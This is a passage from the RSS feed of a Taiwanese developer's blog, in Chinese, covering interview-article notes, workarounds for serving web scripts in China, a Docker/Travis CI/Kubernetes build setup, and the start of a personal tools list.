&lt;p&gt;2016 年 1 月 21 日，人生第 1 份 出社會的工作正式上工以後，一直到 2017 年 12 月 1 日正式離職，在這期間雖然沒有參加任何面試，但也看到了滿多不錯的面試文章。大概在 2016 年 9 月左右，開始覺得自己好像應該把這些不錯的面試文章蒐集起來，並紀錄一下自己當時看完的心得，以供自己日後面試時可以參考複習。往後期間都只有簡短紀錄在 Trello 中，一直沒有花時間整理成一篇文章。剛好利用這段離職後比較閒暇的時間來好好整理一下，後續會紀錄在 &lt;a href="https://github.com/M157q/m157q.github.io/issues?q=is%3Aopen+is%3Aissue+label%3Ainterview"&gt;Issues · M157q/m157q.github.io · GitHub&lt;/a&gt;，如果沒忘記的話也會更新在這篇文章就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;內文&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.rowkey.me/blog/2015/12/31/dev-job-talk/"&gt;研发招聘之殇 - 后端技术杂谈 | 飒然Hang&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是作者面試許多人後給出的意見，我覺得滿中肯的。  &lt;/li&gt;
&lt;li&gt;因為有面試剛畢業的學生，所以也有點出了中國那邊學生的狀況，基本上跟台灣這邊提到的差不多：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;技术脱离业界前沿  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;基础素质欠缺  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;没有畏惧心  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;知其然不知其所以然  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;提出了中國那邊常見的面試型態：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;N轮算法题目面试  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;掺杂计算机基础知识、算法以及项目经验的面试  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;软件设计  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;现场结对编程/ppt讲解  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;只看学历、学校。这种面试方式  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;群面  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;也提出了自己對於優秀的工程師或技術人員所預期的特質：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;聪明、思维灵活  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;对技术有热情  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;基础知识扎实  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;有执行力  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1473255742.A.ED5.html"&gt;[心得] 台北多家面試心得 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個主要是夠多家（18 間），而且有不少算有一點名氣的新創公司的資訊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://thecodist.com/article/phone-interviews-can-be-so-painful-to-do"&gt;The Codist: Phone Interviews Can Be So Painful To Do&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇是在講作者透過 Phone interview 面試人的經驗。  &lt;/li&gt;
&lt;li&gt;怨念超深，作者目前是迪士尼公司的 Lead iOS engineer，抱怨一堆來面試的人連一些很基本的問題都答不出來。  &lt;/li&gt;
&lt;li&gt;可以拿來引以為戒。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Tech_Job/M.1473663935.A.177.html"&gt;[面試] 研替心得分享及請益-下 (晨星) - 看板 Tech_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是竹科的公司普遍的面試流程。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@jhihsianwu/%E9%97%9C%E6%96%BC%E8%BE%AD%E8%81%B7-%E8%BD%89%E8%A1%8C-%E6%80%9D%E8%80%83-%E6%96%87%E7%AB%A0%E5%88%86%E4%BA%AB-c8c26319d25b"&gt;關於辭職、轉行、思考｜文章分享 – Jhih-Sian Wu – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇嚴格說起來不太算面試相關，不過我覺得跟思考自己的職涯有關，所以其實也滿適合整理在這的。  &lt;/li&gt;
&lt;li&gt;作者整理了滿多相關的文章，很適合給我這種離職完後的人好好想想，提到了一些我沒有想到的觀點或面向。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/hulis-blog/interview-prepare-b815d938f0de"&gt;面試問答準備心得之考前猜題 – Huli’s blog – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇真的整理的很完整，基本上把面試會提到的問題大概都列出來了。  &lt;/li&gt;
&lt;li&gt;很適合在面試前，自己花時間把這些都好好在腦中演練一下，我覺得會滿有幫助的。  &lt;/li&gt;
&lt;li&gt;如果能用英文演練的話更好。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/hulis-blog/stripe-and-i-df35a6f0a799"&gt;我與 Stripe ：一段愛與夢想的故事 – Huli’s blog – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;作者過了好幾關，而且把細節描述的非常詳細，過程中也瞭解到：真的很喜歡一間公司的話到底會為面試準備到什麼程度  &lt;/li&gt;
&lt;li&gt;自己可以拿來好好學習一下&amp;lt;但想不到最後竟然是因為聯絡延宕過久而去了另一間公司，現實生活中的事情總是這樣充滿變數和難以預料啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://medium.com/@Doppler/2017-front-end-%E5%8F%8A-ui-designer-%E9%9D%A2%E8%A9%A6%E7%B4%80%E9%8C%84-bdef59188916"&gt;2017 Front-End 及 UI Designer 面試紀錄 – Doppler Kuo – Medium&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇也紀錄的很詳細，雖然我自己應該是不會面試 Web Front-End 和 UI Designer 相關的工作，但還是很值得參考。  &lt;/li&gt;
&lt;li&gt;面試了 15 間公司，大多數都是偏叫得出名字的新創，但也有大公司。  &lt;/li&gt;
&lt;li&gt;雖然結果好像沒有很亮眼，但每次看到這種面試了很多間的我還是會挺敬佩的就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://crossing.cw.com.tw/blogTopic.action?id=568&amp;amp;nid=8891"&gt;「最後，你有沒有問題想問我們？」──跨國企業面試官，教你7大面試提問法 ｜ 何則文／香蕉夢想家 ｜ 換日線 Crossing&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;滿實用的一篇文章，以前面試完被問到這個都有點不太知道要問什麼，剛好近期又要開始面試了，可以好好想一下裏面的問題。  &lt;/li&gt;
&lt;li&gt;不過感覺這篇比較偏向外商的公司可以問的，像底下還是有人提到以前有問過一樣的問題，但因為被面試官覺得太直接而被迴避掉或被直接反問的。但剛好之後的目標應該主要也是鎖定國外的公司，所以應該遇到這個狀況的可能性會比較低一點。  &lt;/li&gt;
&lt;li&gt;這邊節錄一下 7 個問題：  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;一、「請問這個職缺是怎麼產生的？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;二、「您喜歡這家公司嗎？為什麼？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;三、「就我的理解，公司目前在業界的情況、主要競爭對手，我的理解是不是正確的？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;四、「您認為公司在業界中，最大的競爭優勢是什麼？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;五、「您認為這個職缺需要的核心能力是什麼？希望具備什麼特質？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;六、「如果我最後沒能進入貴公司，最大的因素是？您認為我哪方面需要再加強？」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;七、「詢問姓名、職稱與聯絡方式」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;心得&lt;/h2&gt;
&lt;p&gt;剛好在上一份工作離職前，得到了第一次面試別人的機會，面試完後的感想紀錄在此：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;面試時不要不懂裝懂，真的會讓懂得人不知道該擺出甚麼表情。  &lt;/li&gt;
&lt;li&gt;講不知道後再根據自己已知的事物聯想提問，跟一知半解得胡亂猜測單純找話講，觀感天差地遠。  &lt;/li&gt;
&lt;li&gt;上禮拜面試人的感想，近期自己可能也要去面試，順便用來自省。  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Interview"></category><category term="Job"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>中國網路相關筆記</title><link href="https://blog.m157q.tw/posts/2018/01/11/dealing-with-china-network/" rel="alternate"></link><published>2018-01-11T16:00:26+08:00</published><updated>2018-01-11T16:00:26+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-11:posts/2018/01/11/dealing-with-china-network/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;2016 年 8 月緊急接到要支援客戶在中國的服務，但我們現有的 infrastructure 都是在台灣，又不可能在短時間內全部搬到中國的雲服務商那，所以就用上了各種 workaround，最後算是得到了一個還可以接受的結果，雖然不盡理想就是。  &lt;/p&gt;
&lt;p&gt;當時實在是忙到沒啥時間紀錄，最近比較有空了，用這篇文章留個紀錄一下。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;一些可以用來輔助的網站&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.greatfire.org/analyzer"&gt;https://en.greatfire.org/analyzer&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;TEST URL 可以讓你檢查某個網址在中國是不是被禁止的  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.17ce.com/"&gt;https://www.17ce.com/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用來檢查中國大部份地區以及少數國外地區連到某個網站的狀況  &lt;/li&gt;
&lt;li&gt;我後來有寫個爬蟲專門爬這網站的結果，每個小時去檢查連到某個網址的狀況。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ping.chinaz.com/"&gt;http://ping.chinaz.com/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;可以用來檢查中國大部份地區以及少數國外地區連到某個網站的狀況  &lt;/li&gt;
&lt;li&gt;我後來有寫個爬蟲專門爬這網站的結果，每個小時去檢查連到某個網址的狀況。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.speedtest.cn/"&gt;http://www.speedtest.cn/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;中國的 SpeedTest  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.webkaka.com/"&gt;http://www.webkaka.com/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一樣是中國大部份地區連到某個網址的狀況，但伺服器的站點數量沒有很多，有些省分沒有。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://tools.cloudxns.net/"&gt;http://tools.cloudxns.net/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有一系列的工具可以使用，主要都是跟 DNS 比較相關。  &lt;/li&gt;
&lt;li&gt;當時是用來查合作伙伴的伺服器到底有沒有指到中國內的伺服器用的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.hidemyass.com/proxy"&gt;https://www.hidemyass.com/proxy&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;免費的 web proxy，當時用來檢測中國國內某個地方是否可以成功存取我們的資源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm"&gt;https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;免費的 chrome plugin，當時用來檢測中國國內某個地方是否可以成功存取我們的資源。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gdaily.org/8170/free-proxy-google-china-japan-usa"&gt;https://www.gdaily.org/8170/free-proxy-google-china-japan-usa&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;整理了一些免費的 proxy 資源，主要是 proxy 到牆內用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://proxy.moo.jp/zh/?c=CN&amp;amp;pt=&amp;amp;pr=&amp;amp;a%5B%5D=0&amp;amp;a%5B%5D=1&amp;amp;a%5B%5D=2&amp;amp;u=0"&gt;http://proxy.moo.jp/zh/?c=CN&amp;amp;pt=&amp;amp;pr=&amp;amp;a%5B%5D=0&amp;amp;a%5B%5D=1&amp;amp;a%5B%5D=2&amp;amp;u=0&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;列出了有哪些免費的 proxy 位址可供使用。  &lt;/li&gt;
&lt;li&gt;但很常變動，常常要換就是。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ipcn.chacuo.net/"&gt;http://ipcn.chacuo.net/&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;列出中國 IP 對應到哪個電信商及省分的列表  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;當然使用免費的 proxy 就要記得不要在網站上輸入啥私密資料了，畢竟很有可能會被錄封包。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;狀況&lt;/h2&gt;
&lt;p&gt;因為現有的服務使用 Google Cloud Platform，伺服器在美國，客戶在中國的網站直接嵌入我們原本提供的 JavaScript 會被中國的防火長城擋掉，導致客戶的網站上看到錯誤，或是要等很久才能載入，等於現有的服務無法提供使用。除了短時間內無法搬到中國的雲服務商上面以外，老闆也不太希望這麼做，一方面是時間上的壓力，一方面是費用的問題，所以還是希望能夠儘量用現有的服務，如果不能全部搬過去也沒差，只要有辦法得到的一個能接受的結果就好。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;歷程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;因為連不到放在美國伺服器上的 JavaScript，所以得把目前在用的 JavaScript 放一份到中國雲服務商上，最好還要有 CDN。  &lt;ul&gt;
&lt;li&gt;原本有想說要比較中國各服務商例如：青雲、阿里雲、騰訊雲等等，哪些比較好用。但後來因為公司以前有陣子有用阿里雲的服務，所以有帳號，加上時間很趕，所以就直接使用阿里雲了。  &lt;/li&gt;
&lt;li&gt;把公司自己的 JavaScript 複製到阿里雲上之後，可以成功連到了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;但使用的 Google Tag Manager 要載入的 gtm.js 在有些狀況仍然連不到，但有時候卻連得到。  &lt;ul&gt;
&lt;li&gt;這部份除非不用 Google Tag Manager，不然基本上沒有什麼太好的解法。  &lt;/li&gt;
&lt;li&gt;遇到的時候有去找中國有沒有類似 Google Tag Manager 的服務，但找不太到。  &lt;/li&gt;
&lt;li&gt;加上公司使用 Google Tag Manager 有弄出自己的一套架構，所以要搬也沒那麼好搬。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;就想說能不能幫 gtm.js 弄個 proxy。  &lt;ul&gt;
&lt;li&gt;有找到這個：&lt;a href="http://www.ajax-cross-origin.com/"&gt;Ajax Cross Origin - jQuery plugin&lt;/a&gt;，實際也有架起來。  &lt;/li&gt;
&lt;li&gt;但後來才想到這樣根本行不通，因為 gtm.js 會紀錄使用者的行為，架了一個 proxy 的話就會被擋住。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;到此已經放棄讓所有使用者都載入 gtm.js 了，轉而變成「讓可以載入的使用者載入，無法載入的就不要載入，而且不能顯示有錯誤。」因為客戶要求不能在連到他們的網站時在瀏覽器的 console 中看到任何錯誤。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;於是轉而想說能不能做到「如果嘗試載入 JavaScript 一段時間後不成功的話就停止載入。」  &lt;ul&gt;
&lt;li&gt;有找到 StackOverflow 上的這篇： &lt;a href="https://stackoverflow.com/questions/5642270/load-a-javascript-file-but-cancel-if-it-takes-too-long"&gt;browser - Load a Javascript file, but cancel if it takes too long? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;試了一下發現無法成功。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;最後自己想出了一個折衷的辦法，但非常的土炮。  &lt;ul&gt;
&lt;li&gt;我在阿里雲上開了台虛擬機，用 Django 架了個伺服器。  &lt;/li&gt;
&lt;li&gt;寫了個 crawler 每小時固定去爬上面提到的 &lt;a href="https://www.17ce.com/"&gt;https://www.17ce.com/&lt;/a&gt; 和 &lt;a href="http://ping.chinaz.com/"&gt;http://ping.chinaz.com/&lt;/a&gt; ，把他們有沒有辦法載入 gtm.js 的結果紀錄起來。  &lt;ul&gt;
&lt;li&gt;其結果會包含省分、電信商及其能不能載入。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;另外一個 crawler 則是去爬 &lt;a href="http://ipcn.chacuo.net/"&gt;http://ipcn.chacuo.net/&lt;/a&gt;，把所有 IP 對應到的省分和電信商紀錄下來，每天會更新一次。  &lt;/li&gt;
&lt;li&gt;最後在使用者瀏覽客戶的網站要嘗試載入 gtm.js 之前，會先去問我用 Django 架起來的伺服器，會把使用者的 IP 當參數送過來。  &lt;/li&gt;
&lt;li&gt;伺服器收到使用者的 IP 後，先去拿到其所屬的省分和電信商，再去檢查最近一個小時的結果是否能夠載入，如果可以載入的話，API 就會回傳 true 回去，不行的話就回傳 false，當然都是包成 JSON 回傳回去。  &lt;/li&gt;
&lt;li&gt;伺服器同時也會把來詢問的結果紀錄到資料庫裡頭，以供日後查詢統計用。最後發現平均能夠載入載入的比例大概是四成左右而已，雖然少的可憐，但至少是可以接受的結果。  &lt;/li&gt;
&lt;li&gt;是說這個 Django 專案也算是我第一個完全自己獨力完成的，也學到了不少東西。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;最後整件事情弄完的結論就是：如果原本沒有做中國的服務然後哪天要做中國的服務的話，絕對不要堅持用現有的服務來用，除非確定完全可以動。不然就會出現各種奇怪的狀況，需要各種不同的 workaround 來解，真的會很累。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ajax-cross-origin.com/install.html"&gt;Ajax Cross Origin - jQuery plugin&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://webmasters.stackexchange.com/questions/81878/google-tag-manager-blocked-in-china"&gt;Google Tag Manager blocked in China..? - Webmasters Stack Exchange&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/5642270/load-a-javascript-file-but-cancel-if-it-takes-too-long"&gt;browser - Load a Javascript file, but cancel if it takes too long? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="China"></category><category term="Network"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Docker + Travis CI + Kubernetes + GKE</title><link href="https://blog.m157q.tw/posts/2018/01/10/docker-travis-ci-kubernetes-gke/" rel="alternate"></link><published>2018-01-11T17:01:19+08:00</published><updated>2018-01-11T17:01:19+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-10:posts/2018/01/10/docker-travis-ci-kubernetes-gke/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這篇是 2016 年 6 月時的紀錄，當時剛接觸 Docker 和 Kubernetes 4 個月左右，在把舊的服務根據性質拆分成 3 個不同的 mircro serverices，想要做到讓 Travis CI 在跑完測試後，自動 build Docker image，再把 image 丟到 Google Cloud Platform 上，讓 GKE 使用。  &lt;/p&gt;
&lt;p&gt;當時還沒有 Google Cloud Builder 可以使用，所以在找尋解法的時候看到果然有人已經這麼做了。以下就來紀錄一下方法。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;概要&lt;/h2&gt;
&lt;p&gt;學 Kubernetes 的時候找到了這簡短的文章：&lt;a href="https://chengl.com/orchestrating-docker-with-kubernetes/"&gt;Orchestrating Docker with Kubernetes&lt;/a&gt;，覺得可以讓剛上手的人快速瞭解。  &lt;/p&gt;
&lt;p&gt;至於透過 Travis CI 自動 build image  的部份，照著這篇文章做的確有成功：&lt;a href="https://chengl.com/docker-workflow/"&gt;Docker Workflow&lt;/a&gt;（其實看這篇文章的 &lt;code&gt;.travis.yml&lt;/code&gt; 就可以瞭解整個梗概了），但發現效果不盡理想，儘管已經拆分成 base image 和 production image，在每次 build image 的時候節省掉 build base image 的時間了，但花的時間還是太久。  &lt;/p&gt;
&lt;p&gt;當時因為被抓去做其他事，這部份就只弄到這裡，我覺得滿可惜的，後來大家都還是在 local build image 然後再透過 Makefile 把指令包裝起來，在 local 這邊透過 kubectl 把 image push 到 GCP。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;後續&lt;/h2&gt;
&lt;p&gt;當時過了幾個月後，在 2016 年 9 月看到這篇文章：&lt;a href="https://blog.wu-boy.com/2016/09/docker-cache-on-travis/"&gt;在 Travis 實現 Docker Cache | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;，才發現原來有這樣的解法可以用。  &lt;/p&gt;
&lt;p&gt;後來發現也有很多人遇到一樣的問題，後來也大多是用 &lt;code&gt;docker save&lt;/code&gt;, &lt;code&gt;docker load&lt;/code&gt; 解決:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://giorgos.sealabs.net/docker-cache-on-travis-and-docker-112.html"&gt;Docker cache on Travis and Docker 1.12 // Read at G's // A personal blog from Giorgos Logiotatidis.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/travis-ci/travis-ci/issues/5358"&gt;Caching Docker Images on Build · Issue #5358 · travis-ci/travis-ci · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://atodorov.org/blog/2017/08/07/faster-travis-ci-tests-with-docker-cache/"&gt;Faster Travis CI tests with Docker cache&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/35305492/cache-docker-images-on-travis-ci"&gt;performance - Cache docker images on Travis CI - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://chengl.com/orchestrating-docker-with-kubernetes/"&gt;Orchestrating Docker with Kubernetes&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://chengl.com/docker-workflow/"&gt;Docker Workflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.wu-boy.com/2016/09/docker-cache-on-travis/"&gt;在 Travis 實現 Docker Cache | 小惡魔 - 電腦技術 - 工作筆記 - AppleBOY&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Docker"></category><category term="Kubernetes"></category><category term="Travis CI"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>我平常在電腦上用了哪些程式</title><link href="https://blog.m157q.tw/posts/2018/01/09/tools-i-use/" rel="alternate"></link><published>2018-01-26T03:26:55+08:00</published><updated>2018-01-26T03:26:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-09:posts/2018/01/09/tools-i-use/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;身為一個懶人，不喜歡做重複的事情，所以愛寫程式來把重複的事情解決掉，也因為這樣，所以很常用一些工具來幫助自己節省時間，以提高自己的生產力。  &lt;/p&gt;
&lt;p&gt;想說利用待業這段比較有空的時間，拿這篇文章來詳細紀錄一下自己目前到底用了哪些工具，留個紀錄，之後也可以用來追蹤比較，看看自己之後換了工具的原因，以及是不是真的有比較好。也有可能會變成歷史文，見證什麼時代的眼淚之類的吧（？）  &lt;/p&gt;
&lt;p&gt;身為一個寫程式的阿宅，平常都是用電腦居多，所以這篇只會以電腦用到的部份為主。格式分類參考自一年多前看到的這篇文章：&lt;a href="https://medium.com/hungys-blog/my-software-stack-2a406c1c57c1"&gt;My Software Stack – Hungys.blog() – Medium&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;OS &amp;amp; VM &amp;amp; VPS&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.archlinux.org/"&gt;Arch Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從 2012 年用到現在，算一算也有個 5~6 年了，真的覺得是個很棒的作業系統。（在這之前是使用 Ubuntu。）  &lt;/li&gt;
&lt;li&gt;預設乾乾淨淨，想要裝什麼都自己決定，可以用 pre-compiled package 也可以自己編譯，自訂性挺高的。  &lt;/li&gt;
&lt;li&gt;最棒的還是 Rolling Update 的特性，遇到一些安全性的更新都可以馬上更新，雖然剛開始用的時候會遇到升上去就爛掉的問題，但這幾年已經很少遇到了。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2015/09/10/install-arch-linux-on-macbook-air-mid-2013/"&gt;2015 年 9 月後，直接把 Arch Linux 安裝在 MacBook Air Mid 2013 上使用。&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.virtualbox.org/"&gt;Virtual Box&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;也是個用了很久的 Virtual Machine Manager，支援 Linux 使用，但近幾年開始使用 VPS 之後就沒那麼常用了。  &lt;/li&gt;
&lt;li&gt;以前在使用的時候有遇到些問題，分別寫了幾篇文章紀錄：  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2014/12/04/boot-liveusb-in-virtualbox-4-3-18/"&gt;Boot LiveUSB in VirtualBox 4.3.18 | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2014/11/10/virtualbox-guest-additions-upgrade-install_x11_startup_app-no-script-given/"&gt;VirtualBox Guest additions upgrade: install_x11_startup_app: no script given | Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.m157q.tw/posts/2014/10/16/solution-for-the-failure-to-attach-usb-device-in-virtualbox/"&gt;Solution for the Failure to Attach USB Device in VirtualBox | Just for noting&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇不知道為什麼流量莫名的高，可能很多人都有遇到這問題？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.kali.org/"&gt;Kali Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從它以前還叫作 &lt;a href="https://backtrack-linux.org/"&gt;BackTrack Linux&lt;/a&gt; 的時候就有在用了。  &lt;/li&gt;
